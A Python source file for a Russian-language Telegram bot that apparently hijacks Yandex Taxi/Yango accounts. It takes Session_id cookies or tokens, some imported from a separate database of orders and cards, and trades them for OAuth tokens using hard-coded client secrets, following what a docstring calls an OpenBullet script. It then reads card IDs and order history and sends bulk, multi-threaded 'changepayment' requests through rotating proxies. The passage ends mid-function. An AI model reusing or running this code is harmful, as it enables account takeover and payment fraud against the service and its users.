import logging
import json
import sqlite3
import asyncio
import random
import string
import re
import tempfile
import os
import sys
import threading
import signal
import html
import time
from pathlib import Path
from functools import wraps
from typing import Final, Optional, Tuple, List, Callable, Awaitable

import aiohttp
import cfg
from telegram import (
    Update,
    ReplyKeyboardMarkup,
    ReplyKeyboardRemove,
    InputFile,
    InlineKeyboardButton,
    InlineKeyboardMarkup,
)
from telegram.error import Conflict, NetworkError, RetryAfter, TimedOut
from telegram.ext import ExtBot
from telegram.ext import (
    ApplicationBuilder,
    CommandHandler,
    CallbackQueryHandler,
    MessageHandler,
    ConversationHandler,
    ContextTypes,
    filters,
)

BOT_TOKEN: Final = cfg.TOKEN_BOTA
ADMIN_TG_ID: Final = getattr(cfg, "ADMIN_TG_ID", None)
ALLOWED_USER_IDS: Final = {7515876699, 966094117, 7846689040, 8143695937}

CHANGE_PAYMENT_URL: Final = "https://tc.mobile.yandex.net/3.0/changepayment"
BASE_DIR: Final = Path(__file__).resolve().parent
DB_PATH: Final = Path(os.getenv("BOT_DB_PATH") or (BASE_DIR / "bot.db"))
MIKE_DB_PATH: Final = Path(os.getenv("MIKE_DB_PATH") or (BASE_DIR / "db" / "DB.bd"))
PROXY_FILE: Final = Path(os.getenv("PROXY_FILE_PATH") or (BASE_DIR / "proxy.txt"))

(
    ASK_TOKEN,
    ASK_ORDERID,
    ASK_CARD,
    ASK_ID,
    MENU,
    REMEMBER_CARD,
    ASK_THREADS,
    ASK_TOTAL_REQUESTS,
    ASK_LOG_SESSION_ID,
    ASK_TRIP_VALUE,
    ASK_STREAM_TOKEN,
    ASK_STREAM_ORDERID,
    ASK_STREAM_CARD,
    ASK_STREAM_ID,
    ASK_STREAM_THREADS,
    ASK_STREAM_TOTAL,
    ASK_TRIP_TEXT,
    ASK_ACCESS_TOKEN,
    ASK_SCHEDULE_DELAY,
) = range(19)

logging.basicConfig(
    format="%(asctime)s - %(name)s - %(levelname)s - %(message)s",
    level=logging.INFO,
)
logger = logging.getLogger(__name__)



PROXIES: List[str] = []
_proxy_cycle = None
_proxy_lock = threading.Lock()


def is_user_allowed(user) -> bool:
    return True


async def ensure_user_allowed(update: Update, context: ContextTypes.DEFAULT_TYPE) -> bool:
    return True


def require_access(handler):
    @wraps(handler)
    async def wrapper(update: Update, context: ContextTypes.DEFAULT_TYPE, *args, **kwargs):
        if not await ensure_user_allowed(update, context):
            return ASK_ACCESS_TOKEN
        return await handler(update, context, *args, **kwargs)

    return wrapper


async def safe_reply(
    update: Update,
    context: ContextTypes.DEFAULT_TYPE,
    text: str,
    **kwargs,
):
    message = update.effective_message
    if message:
        return await send_with_retry(lambda: message.reply_text(text, **kwargs))

    chat = update.effective_chat
    if chat:
        return await send_with_retry(
            lambda: context.bot.send_message(chat_id=chat.id, text=text, **kwargs)
        )

    logger.warning("Не удалось найти сообщение/чат для ответа: %s", text)
    return None


async def send_with_retry(
    send_func: Callable[[], Awaitable],
    *,
    retries: int = 3,
    base_delay: float = 1.0,
    max_delay: float = 10.0,
    raise_on_failure: bool = False,
):
    delay = base_delay
    last_exc: Optional[BaseException] = None

    for attempt in range(1, retries + 1):
        try:
            return await send_func()
        except RetryAfter as exc:
            last_exc = exc
            await asyncio.sleep(exc.retry_after)
        except Conflict as exc:
            last_exc = exc
            logger.error("Получен Conflict от Telegram (скорее всего, второй инстанс бота): %s", exc)
            if raise_on_failure:
                raise
            break
        except (TimedOut, NetworkError, asyncio.TimeoutError, aiohttp.ClientError) as exc:
            last_exc = exc
            logger.warning(
                "Ошибка связи с Telegram (%s). Попытка %d/%d.",
                type(exc).__name__,
                attempt,
                retries,
            )
            if attempt < retries:
                await asyncio.sleep(delay)
                delay = min(delay * 2, max_delay)
        except Exception as exc:  # noqa: BLE001
            last_exc = exc
            logger.exception("Не удалось отправить сообщение (попытка %d/%d)", attempt, retries)
            if attempt < retries:
                await asyncio.sleep(delay)
                delay = min(delay * 2, max_delay)

    logger.error("Исчерпаны попытки отправки сообщения: %s", last_exc)
    if raise_on_failure and last_exc:
        raise last_exc
    return None


class ResilientExtBot(ExtBot):
    async def _do_post(self, *args, **kwargs):  # noqa: ANN002, ANN003
        async def _call():
            # Используем явный вызов супер-класса, чтобы избежать ошибок
            # "super(): no arguments" внутри вложенной функции.
            return await super(ResilientExtBot, self)._do_post(*args, **kwargs)

        return await send_with_retry(_call, raise_on_failure=True, retries=5, base_delay=1.0)


async def error_handler(update: object, context: ContextTypes.DEFAULT_TYPE):
    logger.exception("Ошибка при обработке апдейта %s: %s", update, context.error)

    try:
        if isinstance(update, Update):
            await safe_reply(
                update,
                context,
                "Произошла временная ошибка. Попробуй повторить действие чуть позже.",
                reply_markup=main_keyboard(),
            )
    except Exception:  # noqa: BLE001
        logger.debug("Не удалось отправить уведомление об ошибке", exc_info=True)


async def delete_callback_message(query):
    message = getattr(query, "message", None)
    if message is None:
        return
    try:
        await message.delete()
    except Exception:  # noqa: BLE001
        pass


class ChangePaymentClient:
    def __init__(self, base_url: str):
        self.base_url = base_url
        self.proxy_pool: List[str] = []
        self._session: Optional[aiohttp.ClientSession] = None

    async def start(self):
        if self._session is None:
            self._session = aiohttp.ClientSession()

    async def close(self):
        if self._session is not None:
            await self._session.close()
            self._session = None

    def update_proxies(self, proxies: List[str]):
        self.proxy_pool = list(proxies)
        random.shuffle(self.proxy_pool)

    def _next_proxy(self) -> Optional[str]:
        if not self.proxy_pool:
            return None
        return random.choice(self.proxy_pool)

    async def send_change_payment(
        self,
        headers: dict,
        payload: dict,
        use_proxies: bool,
        max_proxy_attempts: int = 3,
        timeout: float = 15.0,
    ) -> Tuple[bool, Optional[int], Optional[str], Optional[str]]:
        assert self._session is not None, "Сначала вызови start()"

        attempts = max_proxy_attempts if (use_proxies and self.proxy_pool) else 1
        last_exc = None
        used_proxy = None

        for _ in range(attempts):
            proxy = self._next_proxy() if use_proxies and self.proxy_pool else None
            used_proxy = proxy

            try:
                async with self._session.post(
                    self.base_url,
                    json=payload,
                    headers=headers,
                    proxy=proxy,
                    timeout=timeout,
                ) as resp:
                    text = await resp.text()
                    return True, resp.status, text, proxy
            except Exception as e:  # noqa: BLE001
                last_exc = str(e)

        return False, None, last_exc, used_proxy


class SessionService:
    def __init__(self, client: ChangePaymentClient):
        self.client = client

    async def send_one(
        self,
        tg_id: int,
        headers: dict,
        payload: dict,
        session_id: str,
        use_proxies: bool,
        max_attempts: int = 3,
    ) -> Tuple[bool, Optional[int], Optional[str]]:
        await self.client.start()

        for attempt in range(1, max_attempts + 1):
            ok, status_code, response_text, used_proxy = await self.client.send_change_payment(
                headers, payload, use_proxies
            )

            if ok and status_code is not None and 200 <= status_code < 300:
                break

            if status_code in {429} or (status_code is not None and status_code >= 500):
                backoff = min(2 ** attempt * 0.5, 10)
                jitter = random.uniform(0, 0.5)
                await asyncio.sleep(backoff + jitter)
            else:
                break

        enriched_body = dict(payload)
        if used_proxy:
            enriched_body["_used_proxy"] = used_proxy

        log_request_to_db(
            tg_id=tg_id,
            url=CHANGE_PAYMENT_URL,
            headers=headers,
            body=enriched_body,
            status_code=status_code,
            response_body=response_text,
            session_id=session_id,
        )

        return ok, status_code, response_text

    async def run_bulk(
        self,
        tg_id: int,
        headers: dict,
        payload: dict,
        use_proxies: bool,
        total_requests: int,
        concurrency: int,
        session_id: str,
        progress_cb: Optional[
            Callable[[int, int, int, Optional[str]], Awaitable[None]]
        ] = None,
        stop_event: Optional[asyncio.Event] = None,
    ) -> Tuple[int, int]:
        await self.client.start()
        stop_event = stop_event or asyncio.Event()

        completed = 0
        success = 0
        counter_lock = asyncio.Lock()
        stats_lock = asyncio.Lock()
        next_idx = 0

        async def worker(worker_id: int):
            nonlocal completed, success, next_idx
            while True:
                if stop_event.is_set():
                    return

                async with counter_lock:
                    if stop_event.is_set() or next_idx >= total_requests:
                        return
                    next_idx += 1

                try:
                    ok, status_code, response_text = await self.send_one(
                        tg_id, headers, payload, session_id, use_proxies
                    )
                except Exception as e:  # noqa: BLE001
                    logger.exception("Ошибка при отправке в потоке %s: %s", worker_id, e)
                    ok, status_code, response_text = False, None, str(e)

                async with stats_lock:
                    completed += 1
                    if ok and status_code is not None and 200 <= status_code < 300:
                        success += 1

                if progress_cb:
                    await progress_cb(completed, success, status_code or 0, response_text)

                if stop_event.is_set():
                    return

                await asyncio.sleep(0.3)

        workers = [asyncio.create_task(worker(i)) for i in range(max(concurrency, 1))]
        await asyncio.gather(*workers, return_exceptions=True)
        return completed, success


http_client = ChangePaymentClient(CHANGE_PAYMENT_URL)
session_service = SessionService(http_client)


def load_proxies():
    global PROXIES, _proxy_cycle
    if not os.path.exists(PROXY_FILE):
        logger.warning("proxy.txt не найден, работа без прокси.")
        PROXIES = []
        _proxy_cycle = None
        return

    proxies = []
    with open(PROXY_FILE, "r", encoding="utf-8") as f:
        for line in f:
            p = line.strip()
            if not p:
                continue
            proxies.append(p)

    PROXIES = proxies
    if PROXIES:
        import itertools

        _proxy_cycle = itertools.cycle(PROXIES)
        logger.info("Загружено %d прокси", len(PROXIES))
    else:
        _proxy_cycle = None
        logger.warning("proxy.txt пустой, работа без прокси.")

    http_client.update_proxies(PROXIES)


def get_next_proxy() -> Optional[str]:
    global _proxy_cycle
    if not PROXIES or _proxy_cycle is None:
        return None
    with _proxy_lock:
        try:
            return next(_proxy_cycle)
        except StopIteration:
            return None


def proxies_enabled() -> bool:
    return bool(PROXIES)


def proxy_state_text() -> str:
    if PROXIES:
        return f"ВКЛ ({len(PROXIES)} шт.)"
    return "нет доступных прокси"



def get_conn():
    return sqlite3.connect(DB_PATH)


def init_db():
    conn = get_conn()
    cur = conn.cursor()

    cur.execute(
        """
        CREATE TABLE IF NOT EXISTS requests (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            tg_id INTEGER NOT NULL,
            url TEXT NOT NULL,
            method TEXT NOT NULL,
            headers TEXT NOT NULL,
            body TEXT NOT NULL,
            status_code INTEGER,
            response_body TEXT,
            created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
        );
        """
    )

    try:
        cur.execute("ALTER TABLE requests ADD COLUMN session_id TEXT;")
    except sqlite3.OperationalError:
        pass  # уже есть

    cur.execute(
        """
        CREATE TABLE IF NOT EXISTS trip_templates (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            tg_id INTEGER NOT NULL,
            trip_name TEXT,
            token2 TEXT,
            trip_id TEXT,
            card TEXT,
            orderid TEXT,
            trip_link TEXT,
            session_id TEXT,
            created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
        );
        """
    )

    try:
        cur.execute("ALTER TABLE trip_templates ADD COLUMN session_id TEXT;")
    except sqlite3.OperationalError:
        pass  # уже есть

    try:
        cur.execute("ALTER TABLE trip_templates ADD COLUMN trip_name TEXT;")
    except sqlite3.OperationalError:
        pass  # уже есть

    cur.execute(
        """
        CREATE TABLE IF NOT EXISTS users (
            tg_id INTEGER PRIMARY KEY,
            token TEXT NOT NULL,
            verified INTEGER DEFAULT 1,
            created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
        );
        """
    )

    try:
        cur.execute("ALTER TABLE users ADD COLUMN verified INTEGER DEFAULT 1;")
    except sqlite3.OperationalError:
        pass

    conn.commit()
    conn.close()


def log_request_to_db(
    tg_id: int,
    url: str,
    headers: dict,
    body: dict,
    status_code: Optional[int],
    response_body: Optional[str],
    session_id: str,
):
    conn = get_conn()
    cur = conn.cursor()

    cur.execute(
        """
        INSERT INTO requests (tg_id, url, method, headers, body, status_code, response_body, session_id)
        VALUES (?, ?, ?, ?, ?, ?, ?, ?);
        """,
        (
            tg_id,
            url,
            "POST",
            json.dumps(headers, ensure_ascii=False),
            json.dumps(body, ensure_ascii=False),
            status_code,
            response_body,
            session_id,
        ),
    )

    conn.commit()
    conn.close()


def random_token(length: int = 10) -> str:
    alphabet = string.ascii_letters + string.digits
    return "".join(random.choices(alphabet, k=length))


def upsert_user_token(tg_id: int, token: str, verified: bool = True) -> str:
    conn = get_conn()
    cur = conn.cursor()
    cur.execute(
        """
        INSERT INTO users (tg_id, token, verified)
        VALUES (?, ?, ?)
        ON CONFLICT(tg_id) DO UPDATE SET token = excluded.token, verified = excluded.verified;
        """,
        (tg_id, token, int(verified)),
    )
    conn.commit()
    conn.close()
    return token


def get_user_token(tg_id: int) -> Optional[str]:
    conn = get_conn()
    cur = conn.cursor()
    cur.execute("SELECT token FROM users WHERE tg_id = ? LIMIT 1;", (tg_id,))
    row = cur.fetchone()
    conn.close()
    if row:
        return row[0]
    return None


def token_exists(token: str) -> bool:
    conn = get_conn()
    cur = conn.cursor()
    cur.execute("SELECT 1 FROM users WHERE token = ? LIMIT 1;", (token,))
    row = cur.fetchone()
    conn.close()
    return bool(row)


def verify_user_by_token(tg_id: int, token: str) -> bool:
    if not token_exists(token):
        return False
    upsert_user_token(tg_id, token, True)
    return True


def is_user_verified(tg_id: int) -> bool:
    conn = get_conn()
    cur = conn.cursor()
    cur.execute("SELECT verified FROM users WHERE tg_id = ? LIMIT 1;", (tg_id,))
    row = cur.fetchone()
    conn.close()
    return bool(row and row[0])


def get_request_count_for_user(tg_id: int) -> int:
    conn = get_conn()
    cur = conn.cursor()
    cur.execute("SELECT COUNT(*) FROM requests WHERE tg_id = ?;", (tg_id,))
    (count,) = cur.fetchone()
    conn.close()
    return count or 0


def create_trip_template(tg_id: int) -> int:
    conn = get_conn()
    cur = conn.cursor()
    cur.execute(
        """
        INSERT INTO trip_templates (tg_id) VALUES (?);
        """,
        (tg_id,),
    )
    trip_id = cur.lastrowid
    conn.commit()
    conn.close()
    return trip_id


def get_trip_template(trip_id: int, tg_id: int) -> Optional[dict]:
    conn = get_conn()
    cur = conn.cursor()
    cur.execute(
        """
        SELECT id, trip_name, token2, trip_id, card, orderid, trip_link, session_id
        FROM trip_templates
        WHERE id = ? AND tg_id = ?
        LIMIT 1;
        """,
        (trip_id, tg_id),
    )
    row = cur.fetchone()
    conn.close()
    if row:
        keys = [
            "id",
            "trip_name",
            "token2",
            "trip_id",
            "card",
            "orderid",
            "trip_link",
            "session_id",
        ]
        return dict(zip(keys, row))
    return None


def update_trip_template_field(trip_id: int, tg_id: int, field: str, value: str) -> None:
    if field not in {
        "trip_name",
        "token2",
        "trip_id",
        "card",
        "orderid",
        "trip_link",
        "session_id",
    }:
        return
    conn = get_conn()
    cur = conn.cursor()
    cur.execute(
        f"UPDATE trip_templates SET {field} = ? WHERE id = ? AND tg_id = ?;",
        (value, trip_id, tg_id),
    )

    if field == "token2":
        cur.execute(
            "UPDATE trip_templates SET session_id = NULL WHERE id = ? AND tg_id = ?;",
            (trip_id, tg_id),
        )
    elif field == "session_id":
        cur.execute(
            "UPDATE trip_templates SET token2 = NULL WHERE id = ? AND tg_id = ?;",
            (trip_id, tg_id),
        )

    conn.commit()
    conn.close()


def find_trip_template_by_token2(tg_id: int, token2: str) -> Optional[int]:
    conn = get_conn()
    cur = conn.cursor()
    cur.execute(
        "SELECT id FROM trip_templates WHERE tg_id = ? AND token2 = ? LIMIT 1;",
        (tg_id, token2),
    )
    row = cur.fetchone()
    conn.close()
    return row[0] if row else None


def ensure_trip_from_token2(
    tg_id: int, token2: str, trip_id: Optional[str], card: Optional[str]
) -> int:
    trip_db_id = find_trip_template_by_token2(tg_id, token2)
    if trip_db_id is None:
        trip_db_id = create_trip_template(tg_id)

    update_trip_template_field(trip_db_id, tg_id, "trip_name", token2)
    update_trip_template_field(trip_db_id, tg_id, "token2", token2)

    if trip_id:
        update_trip_template_field(trip_db_id, tg_id, "trip_id", trip_id)
    if card:
        update_trip_template_field(trip_db_id, tg_id, "card", card)

    return trip_db_id


def list_trip_templates(tg_id: int) -> List[dict]:
    conn = get_conn()
    cur = conn.cursor()
    cur.execute(
        """
        SELECT id, trip_name, token2, trip_id, card, orderid, trip_link, session_id, created_at
        FROM trip_templates
        WHERE tg_id = ?
        ORDER BY id DESC;
        """,
        (tg_id,),
    )
    rows = cur.fetchall()
    conn.close()
    keys = [
        "id",
        "trip_name",
        "token2",
        "trip_id",
        "card",
        "orderid",
        "trip_link",
        "session_id",
        "created_at",
    ]
    return [dict(zip(keys, row)) for row in rows]


def delete_trip_template(trip_id: int, tg_id: int) -> None:
    conn = get_conn()
    cur = conn.cursor()
    cur.execute("DELETE FROM trip_templates WHERE id = ? AND tg_id = ?;", (trip_id, tg_id))
    conn.commit()
    conn.close()


def fetch_mike_orders() -> List[dict]:
    if not os.path.exists(MIKE_DB_PATH):
        return []

    conn = sqlite3.connect(MIKE_DB_PATH)
    cur = conn.cursor()
    try:
        cur.execute("SELECT * FROM orders_info ORDER BY id DESC;")
        rows = cur.fetchall()
    except sqlite3.OperationalError:
        rows = []
    conn.close()

    orders = []
    for row in rows:
        try:
            orders.append(
                {
                    "row_id": row[0],
                    "order_id_primary": row[3],
                    "token2": row[4],
                    "card": row[5],
                    "orderid": row[6],
                    "trip_link": row[7],
                    "created_at": row[9],
                }
            )
        except Exception:  # noqa: BLE001
            continue

    return orders


def fetch_mike_order_by_id(row_id: int) -> Optional[dict]:
    if not os.path.exists(MIKE_DB_PATH):
        return None

    conn = sqlite3.connect(MIKE_DB_PATH)
    cur = conn.cursor()
    try:
        cur.execute("SELECT * FROM orders_info WHERE id = ? LIMIT 1;", (row_id,))
        row = cur.fetchone()
    except sqlite3.OperationalError:
        row = None
    conn.close()

    if not row:
        return None

    try:
        return {
            "row_id": row[0],
            "order_id_primary": row[3],
            "token2": row[4],
            "card": row[5],
            "orderid": row[6],
            "trip_link": row[7],
            "created_at": row[9],
        }
    except Exception:  # noqa: BLE001
        return None


def clear_trip_template(trip_id: int, tg_id: int) -> None:
    conn = get_conn()
    cur = conn.cursor()
    cur.execute(
        """
        UPDATE trip_templates
        SET trip_name = NULL,
            token2 = NULL,
            trip_id = NULL,
            card = NULL,
            orderid = NULL,
            trip_link = NULL,
            session_id = NULL
        WHERE id = ? AND tg_id = ?;
        """,
        (trip_id, tg_id),
    )
    conn.commit()
    conn.close()


def import_mike_order_to_trip(order: dict, tg_id: int) -> Optional[int]:
    if not order:
        return None

    trip_db_id = create_trip_template(tg_id)

    title = order.get("created_at") or f"Майк #{order.get('row_id')}"
    if title:
        update_trip_template_field(trip_db_id, tg_id, "trip_name", str(title))

    mappings = {
        "trip_id": order.get("order_id_primary") or "",
        "token2": order.get("token2") or "",
        "card": order.get("card") or "",
        "orderid": order.get("orderid") or "",
        "trip_link": order.get("trip_link") or "",
    }

    for field, val in mappings.items():
        if val:
            update_trip_template_field(trip_db_id, tg_id, field, str(val))

    return trip_db_id


def export_session_logs_to_file(tg_id: int, session_id: str) -> Optional[str]:

    conn = get_conn()
    cur = conn.cursor()
    cur.execute(
        """
        SELECT id, created_at, status_code, response_body
        FROM requests
        WHERE tg_id = ? AND session_id = ?
        ORDER BY id;
        """,
        (tg_id, session_id),
    )
    rows = cur.fetchall()
    conn.close()

    if not rows:
        return None

    fd, path = tempfile.mkstemp(suffix=".txt", prefix=f"logs_{session_id}_")
    os.close(fd)

    with open(path, "w", encoding="utf-8") as f:
        f.write(f"TG ID: {tg_id}\n")
        f.write(f"Session ID: {session_id}\n")
        f.write(f"Всего записей: {len(rows)}\n")
        f.write("=" * 50 + "\n\n")

        for idx, (req_id, created_at, status_code, response_body) in enumerate(
            rows, start=1
        ):
            f.write(f"Запрос #{idx} (DB id={req_id})\n")
            f.write(f"Время: {created_at}\n")
            f.write(f"HTTP статус: {status_code}\n")
            f.write("Ответ:\n")
            f.write(response_body if response_body is not None else "")
            f.write("\n" + "-" * 40 + "\n\n")

    return path


async def fetch_session_details(session_id: str) -> dict:
    """Получить ID профиля и карту по session_id, повторяя шаги скрипта OpenBullet."""

    headers = {
        "Accept-Encoding": "gzip, deflate, br",
        "Accept-Language": "ru",
        "Content-Type": "application/json; charset=utf-8",
        "User-Agent": "yango/1.6.0.49 go-platform/0.1.19 Android/",
    }

    cookies = {"Session_id": session_id}
    result: dict = {"session_id": session_id, "_debug_responses": []}

    async with aiohttp.ClientSession() as session:
        async with session.post(
            "https://tc.mobile.yandex.net/3.0/launch", json={}, headers=headers, cookies=cookies
        ) as resp:
            launch_text = await resp.text()

    result["_debug_responses"].append(
        {
            "step": "launch",
            "response": f"ID профиля: {result.get('trip_id', '—')}",
        }
    )

    user_id_match = re.search(r"\"id\":\"([^\"]+)\"", launch_text)
    if user_id_match:
        result["trip_id"] = user_id_match.group(1)

    if "trip_id" not in result:
        return result

    payment_headers = dict(headers)
    payment_headers["Content-Type"] = "application/x-www-form-urlencoded; charset=utf-8"

    payload = json.dumps({"id": result["trip_id"]}, ensure_ascii=False)

    async with aiohttp.ClientSession() as session:
        async with session.post(
            "https://tc.mobile.yandex.net/3.0/paymentmethods",
            data=payload,
            headers=payment_headers,
            cookies=cookies,
        ) as resp:
            payment_text = await resp.text()

    result["_debug_responses"].append(
        {
            "step": "paymentmethods",
            "response": f"Карта: {result.get('card', '—')}",
        }
    )

    card_match = re.search(r"\"id\":\"(card[^\"]*)\"", payment_text)
    if card_match:
        result["card"] = card_match.group(1)

    token2 = await fetch_token2(session_id)
    if token2:
        orderid, price, history_resp = await fetch_order_history_orderid(token2, session_id)
        result["_debug_responses"].append(
            {"step": "order_history", "response": _pretty_json_or_text(history_resp)}
        )
        if orderid:
            result["orderid"] = orderid
        if price is not None:
            result["price"] = price

    return result


async def fetch_trip_details_from_token(token2: str) -> dict:
    """Получить ID профиля и карту по token2 через авторизационный заголовок."""

    headers = {
        "Accept-Encoding": "gzip, deflate, br",
        "Accept-Language": "ru",
        "Content-Type": "application/json; charset=utf-8",
        "User-Agent": "yango/1.6.0.49 go-platform/0.1.19 Android/",
        "Authorization": f"Bearer {token2}",
    }

    result: dict = {"token2": token2, "_debug_responses": []}

    async with aiohttp.ClientSession() as session:
        async with session.post(
            "https://tc.mobile.yandex.net/3.0/launch", json={}, headers=headers
        ) as resp:
            launch_text = await resp.text()

    result["_debug_responses"].append(
        {
            "step": "launch",
            "response": f"ID профиля: {result.get('trip_id', '—')}",
        }
    )

    user_id_match = re.search(r"\"id\":\"([^\"]+)\"", launch_text)
    if user_id_match:
        result["trip_id"] = user_id_match.group(1)

    if "trip_id" not in result:
        return result

    payment_headers = dict(headers)
    payment_headers["Content-Type"] = "application/x-www-form-urlencoded; charset=utf-8"

    payload = json.dumps({"id": result["trip_id"]}, ensure_ascii=False)

    async with aiohttp.ClientSession() as session:
        async with session.post(
            "https://tc.mobile.yandex.net/3.0/paymentmethods",
            data=payload,
            headers=payment_headers,
        ) as resp:
            payment_text = await resp.text()

    result["_debug_responses"].append(
        {
            "step": "paymentmethods",
            "response": f"Карта: {result.get('card', '—')}",
        }
    )

    card_match = re.search(r"\"id\":\"(card[^\"]*)\"", payment_text)
    if card_match:
        result["card"] = card_match.group(1)

    return result


def _generate_random_user_id() -> str:
    letters = [random.choice("abcdefghijklmnopqrstuvwxyz") for _ in range(5)]
    digits = [random.choice("0123456789") for _ in range(5)]
    mixed = letters + digits
    random.shuffle(mixed)
    return "".join(mixed)


def _pretty_json_or_text(raw: str) -> str:
    try:
        parsed = json.loads(raw)
        return json.dumps(parsed, ensure_ascii=False, indent=2)
    except Exception:  # noqa: BLE001
        return raw


def _trim_text(text: str, max_len: int = 1200) -> str:
    if not isinstance(text, str):
        return ""
    if len(text) <= max_len:
        return text
    return text[: max_len - 3] + "..."


def _format_debug_responses(responses: Optional[list]) -> str:
    if not isinstance(responses, list) or not responses:
        return ""

    chunks = ["Ответы запросов (JSON):"]
    total_len = 0

    for entry in responses:
        if not isinstance(entry, dict):
            continue
        step = entry.get("step") or "request"
        body = _trim_text(entry.get("response") or "", 1200)
        chunk = f"{step}:\n```json\n{body}\n```"
        total_len += len(chunk)
        if total_len > 3500:
            chunks.append("[вывод обрезан, чтобы пройти ограничение Telegram]")
            break
        chunks.append(chunk)

    return "\n".join(chunks)


async def fetch_token2(session_id: str) -> Optional[str]:
    headers = {
        "Host": "mobileproxy.passport.yandex.net",
        "Content-Type": "application/x-www-form-urlencoded; charset=utf-8",
        "Accept": "*/*",
        "Accept-Encoding": "gzip, deflate, br",
        "Connection": "keep-alive",
        "Content-Length": "125",
        "User-Agent": "com.yandex.mobile.auth.sdk/6.20.9.1147 (Apple iPhone15,3; iOS 17.0.2)",
        "Accept-Language": "ru-RU;q=1",
        "Ya-Client-Host": "yandex.ru",
        "Ya-Client-Cookie": f"Session_id={session_id}",
    }

    data = (
        "client_id=c0ebe342af7d48fbbbfcf2d2eedb8f9e&client_secret=ad0a908f0aa341a182a37ecd75bc319e"
        "&grant_type=sessionid&host=yandex.ru"
    )

    access_token = None
    async with aiohttp.ClientSession() as session:
        async with session.post(
            "https://mobileproxy.passport.yandex.net/1/bundle/oauth/token_by_sessionid",
            data=data,
            headers=headers,
        ) as resp:
            resp_text = await resp.text()

    token_match = re.search(r"\"access_token\":\"([^\"]+)\"", resp_text)
    if token_match:
        access_token = token_match.group(1)
    if not access_token:
        return None

    token_headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36",
        "Pragma": "no-cache",
        "Accept": "*/*",
    }

    token_payload = (
        "grant_type=x-token"
        f"&access_token={access_token}"
        "&client_id=f576990d844e48289d8bc0dd4f113bb9"
        "&client_secret=c6fa15d74ddf4d7ea427b2f712799e9b"
        "&payment_auth_retpath=https%3A%2F%2Fpassport.yandex.ru%2Fclosewebview"
    )

    async with aiohttp.ClientSession() as session:
        async with session.post(
            "https://mobileproxy.passport.yandex.net/1/token",
            data=token_payload,
            headers=token_headers,
        ) as resp:
            token_resp_text = await resp.text()

    token2_match = re.search(r"\"access_token\": ?\"([^\"]+)\"", token_resp_text)
    if token2_match:
        return token2_match.group(1)
    return None


def _extract_orderid_from_history(resp_text: str) -> Tuple[Optional[str], Optional[float]]:
    orderid: Optional[str] = None
    price: Optional[float] = None

    def _deep_search_for_orderid(obj) -> Optional[str]:
        stack = [obj]
        while stack:
            current = stack.pop()
            if isinstance(current, dict):
                for key, val in current.items():
                    if key in {"orderid", "order_id", "id"} and isinstance(val, (str, int)):
                        if str(val):
                            return str(val)
                    if isinstance(val, (dict, list)):
                        stack.append(val)
            elif isinstance(current, list):
                stack.extend(current)
        return None

    try:
        payload = json.loads(resp_text)
        orders = (
            payload.get("orders")
            or payload.get("result", {}).get("orders")
            or payload.get("data", {}).get("orders")
        )
        if isinstance(orders, list) and orders:
            item = orders[0]
            if isinstance(item, dict):
                data = item.get("data")
                if isinstance(data, dict):
                    item_id = data.get("item_id")
                    if isinstance(item_id, dict):
                        nested = item_id.get("order_id") or item_id.get("orderid")
                        if isinstance(nested, (str, int)) and nested:
                            orderid = str(nested)

                    if orderid is None:
                        for key in ("orderid", "order_id"):
                            val = data.get(key)
                            if isinstance(val, (str, int)) and val:
                                orderid = str(val)
                                break

                    payment = data.get("payment")
                    if isinstance(payment, dict):
                        raw_price = None
                        for key in ("cost", "final_cost"):
                            candidate = payment.get(key)
                            if isinstance(candidate, (int, float)):
                                raw_price = float(candidate)
                                break
                            if isinstance(candidate, str) and candidate:
                                price_match = re.search(r"([0-9]+(?:[\\.,][0-9]+)?)", candidate)
                                if price_match:
                                    raw_price = float(price_match.group(1).replace(",", "."))
                                    break

                        if raw_price is not None:
                            price = raw_price

                if orderid is None:
                    for key in ("orderid", "order_id", "id"):
                        val = item.get(key)
                        if isinstance(val, (str, int)) and val:
                            orderid = str(val)
                            break

                if orderid is None:
                    orderid = _deep_search_for_orderid(item)
    except Exception:  # noqa: BLE001
        pass

    if orderid is None:
        match = re.search(r"\"orderid\"\s*:\s*\"([^\"]+)\"", resp_text)
        if match:
            orderid = match.group(1)

    if orderid is None:
        match = re.search(r"\"order_id\"\s*:\s*\"([^\"]+)\"", resp_text)
        if match:
            orderid = match.group(1)

    return orderid, price


async def fetch_order_history_orderid(
    token2: str, session_id: str
) -> Tuple[Optional[str], Optional[float], str]:
    headers = {
        "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 18_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) yandex-taxi/700.116.0.501961",
        "Connection": "keep-alive",
        "Authorization": f"Bearer {token2}",
        "X-YaTaxi-UserId": _generate_random_user_id(),
        "Cookie": f"Session_id={session_id}",
    }

    body = {
        "services": {
            "taxi": {"image_tags": {"size_hint": 9999}, "flavors": ["default"]},
            "eats": {},
            "grocery": {},
            "grocery_b2b": {},
            "drive": {},
            "scooters": {},
            "qr_pay": {},
            "shuttle": {},
            "market": {},
            "market_locals": {},
            "delivery": {},
            "korzinkago": {},
            "dealcart": {},
            "naheed": {},
            "almamarket": {},
            "supermarketaz": {},
            "chargers": {},
            "cartech": {},
            "afisha": {},
            "masstransit": {},
            "shop": {},
            "pharma": {},
            "ambulance": {},
            "places_bookings": {},
            "buy_sell": {},
        },
        "range": {"results": 20},
        "country_code": "RU",
        "include_service_metadata": True,
        "is_updated_masstransit_history_available": True,
    }

    async with aiohttp.ClientSession() as session:
        async with session.post(
            "https://m.taxi.yandex.ru/order-history-frontend/api/4.0/orderhistory/v2/list",
            json=body,
            headers=headers,
        ) as resp:
            resp_text = await resp.text()

    orderid, price = _extract_orderid_from_history(resp_text)
    return orderid, price, resp_text


async def autofill_trip_from_session(trip_id: int, tg_id: int, session_id: str) -> str:
    try:
        parsed = await fetch_session_details(session_id)
    except Exception as e:  # noqa: BLE001
        logger.warning("Не удалось автозаполнить поездку по session_id: %s", e)
        return "Не смог автоматически заполнить данные по session_id."

    updated_fields = []

    for field in ("trip_id", "card", "orderid"):
        value = parsed.get(field)
        if value:
            update_trip_template_field(trip_id, tg_id, field, value)
